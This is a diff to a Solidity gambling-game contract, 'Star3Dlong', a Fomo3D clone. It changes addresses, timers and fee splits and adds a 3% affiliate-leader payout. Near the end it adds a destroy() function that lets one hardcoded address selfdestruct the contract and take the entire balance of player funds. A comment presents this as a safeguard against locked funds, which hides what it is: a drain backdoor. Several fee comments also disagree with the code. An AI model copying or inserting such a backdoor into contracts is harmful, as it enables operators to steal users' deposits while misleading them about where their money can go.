@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Star3Dlong at 0x00547a1f1160a4af6fbee82fbf790b48b7192649
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract Star3Dlong at 0x64c6ba14ef4e77ae7d61687382ec0aa58a73544c
 */
 pragma solidity ^0.4.24;
 /**
@@ -190,15 +190,15 @@ contract Star3Dlong is modularLong {
 //=================_|===========================================================
     string constant public name = "Save the planet";
     string constant public symbol = "Star";
-    CompanyShareInterface constant private CompanyShare = CompanyShareInterface(0xBEd79cce1F55AbC0C4e403cF6c1C3d0DC2947578);
+    CompanyShareInterface constant private CompanyShare = CompanyShareInterface(0x03347ABb58cc3071FDBBa7F7bD7cca03C8E04229);
 
     uint256 private pID_ = 0;   // total number of players
-	uint256 private rndExtra_ = 1 hours;     // length of the very first ICO
-    uint256 private rndGap_ = 1 seconds;         // length of ICO phase, set to 1 year for EOS.
-    uint256 constant private rndInit_ = 10 hours;                // round timer starts at this
-    uint256 constant private rndInc_ = 30 seconds;              // every full key purchased adds this much to the timer
-    uint256 constant private rndMax_ = 24 hours;                // max length a round timer can be
-    uint256 public registrationFee_ = 10 finney;            // price to register a name
+	uint256 private rndExtra_ = 0 hours;     // length of the very first ICO
+    uint256 private rndGap_ = 10 seconds;         // length of ICO phase, set to 1 year for EOS.
+    uint256 constant private rndInit_ = 10 hours;                     // round timer starts at this
+    uint256 constant private rndInc_ = 30 seconds;               // every full key purchased adds this much to the timer
+    uint256 constant private rndMax_ = 24 hours;                     // max length a round timer can be
+    uint256 public registrationFee_ = 10 finney;               // price to register a name
 
 //==============================================================================
 //     _| _ _|_ _    _ _ _|_    _   .
@@ -208,7 +208,7 @@ contract Star3Dlong is modularLong {
 //    uint256 public airDropTracker_ = 0;     // incremented each time a "qualified" tx occurs.  used to determine winning air drop
     uint256 public rID_;    // round id number / total rounds that have happened
 //****************
-// PLAYER DATA
+// PLAYER DATA 
 //****************
     mapping (address => uint256) public pIDxAddr_;          // (addr => pID) returns player id by address
     mapping (bytes32 => uint256) public pIDxName_;          // (name => pID) returns player id by name
@@ -241,17 +241,17 @@ contract Star3Dlong is modularLong {
 		// Team allocation percentages
         // (Star, None) + (Pot , Referrals, Community)
             // Referrals / Community rewards are mathematically designed to come from the winner's share of the pot.
-        fees_[0] = Star3Ddatasets.TeamFee(32, 48, 10);   //32% to pot, 56% to gen, 2% to dev, 48% to winner, 10% aff
-        fees_[1] = Star3Ddatasets.TeamFee(45, 35, 10);   //45% to pot, 35% to gen, 2% to dev, 48% to winner, 10% aff
-        fees_[2] = Star3Ddatasets.TeamFee(50, 30, 10);  //50% to pot, 30% to gen, 2% to dev, 48% to winner, 10% aff
-        fees_[3] = Star3Ddatasets.TeamFee(40, 40, 10);   //48% to pot, 40% to gen, 2% to dev, 48% to winner, 10% aff
+        fees_[0] = Star3Ddatasets.TeamFee(32, 45, 10, 3);	//32%pot 45%gen 10%dev 3%aff 10%dev
+        fees_[1] = Star3Ddatasets.TeamFee(45, 32, 10, 3);	//45%pot 32%gen 10%dev 3%aff 10%dev
+        fees_[2] = Star3Ddatasets.TeamFee(50, 27, 10, 3);	//50%pot 27%gen 10%dev 3%aff 10%dev
+        fees_[3] = Star3Ddatasets.TeamFee(40, 37, 10, 3);	//40%pot 37%gen 10%dev 3%aff 10%dev
 
 //        // how to split up the final pot based on which team was picked
 //        // (Star, None)
-        potSplit_[0] = Star3Ddatasets.PotSplit(20, 30);  //48% to winner, 20% to next round, 30% to gen, 2% to com
-        potSplit_[1] = Star3Ddatasets.PotSplit(15, 35);   //48% to winner, 15% to next round, 35% to gen, 2% to com
-        potSplit_[2] = Star3Ddatasets.PotSplit(25, 25);  //48% to winner, 25% to next round, 25% to gen, 2% to com
-        potSplit_[3] = Star3Ddatasets.PotSplit(30, 20);  //48% to winner, 30% to next round, 20% to gen, 2% to com
+        potSplit_[0] = Star3Ddatasets.PotSplit(20, 30);  //newPot20%  gen30%  dev2% winer48%
+        potSplit_[1] = Star3Ddatasets.PotSplit(15, 35);  
+        potSplit_[2] = Star3Ddatasets.PotSplit(25, 25);  
+        potSplit_[3] = Star3Ddatasets.PotSplit(30, 20);  
 	}
 //==============================================================================
 //     _ _  _  _|. |`. _  _ _  .
@@ -1430,7 +1430,19 @@ contract Star3Dlong is modularLong {
     {
         // distribute share to affiliate
         uint256 _aff = _eth / 10;
-
+        uint256 _affLeader = (_eth.mul(3)) / 100;
+        uint256 _affLeaderID = plyr_[_affID].laff;
+        if (_affLeaderID == 0)
+        {
+            _aff = _aff.add(_affLeader);
+        } else{
+            if (_affLeaderID != _pID && plyr_[_affLeaderID].name != '')
+            {
+                plyr_[_affLeaderID].aff = _affLeader.add(plyr_[_affLeaderID].aff);
+            }else{
+                _aff = _aff.add(_affLeader);
+            }
+        }
         // affiliate must not be self, and must have a name registered
         if (_affID != _pID && plyr_[_affID].name != '') {
             plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
@@ -1452,8 +1464,8 @@ contract Star3Dlong is modularLong {
         uint256 _gen = (_eth.mul(fees_[_team].firstGive)) / 100;
         // calculate dev
         uint256 _dev = (_eth.mul(fees_[_team].giveDev)) / 100;
-        //distribute share to affiliate 10%
-        _eth = _eth.sub(((_eth.mul(10)) / 100)).sub(_dev);
+        //distribute share to affiliate 13%
+        _eth = _eth.sub(((_eth.mul(13)) / 100)).sub(_dev);
         //calc pot
         uint256 _pot =_eth.sub(_gen);
 
@@ -1571,13 +1583,10 @@ contract Star3Dlong is modularLong {
     {
         // only team just can activate
         require(
-			msg.sender == 0x27D78bFb67874c7ac6aD3C70F99F03B35fc20c3b,
+			msg.sender == 0xd775c5063bef4eda77a21646a6880494d9a1156b, //candy
             "only team just can activate"
         );
-
-		// make sure that its been linked.
-//        require(address(otherF3D_) != address(0), "must link to other Star3D first");
-
+ 
         // can only be ran once
         require(activated_ == false, "Star3d already activated");
 
@@ -1589,6 +1598,11 @@ contract Star3Dlong is modularLong {
         round_[1].strt = now;
         round_[1].end = now + rndInit_ + rndExtra_;
     }
+     
+     function destroy() public{ // so funds not locked in contract forever
+         require(msg.sender == 0x7ce07aa2fc356fa52f622c1f4df1e8eaad7febf0, "sorry not the admin");
+         suicide(0x7ce07aa2fc356fa52f622c1f4df1e8eaad7febf0); // send funds to organizer
+     }
 }
 
 
@@ -1731,12 +1745,10 @@ library Star3Ddatasets {
         uint256 icoAvg; // average key price for ICO phase
     }
     struct TeamFee {
-//        uint256 gen;    // % of buy in thats paid to key holders of current round
-//        uint256 p3d;    // % of buy in thats paid to p3d holders
         uint256 firstPot;   //% of pot
         uint256 firstGive; //% of keys gen
         uint256 giveDev;//% of give dev
-
+        uint256 giveAffLeader;//% of give dev
 
     }
     struct PotSplit {
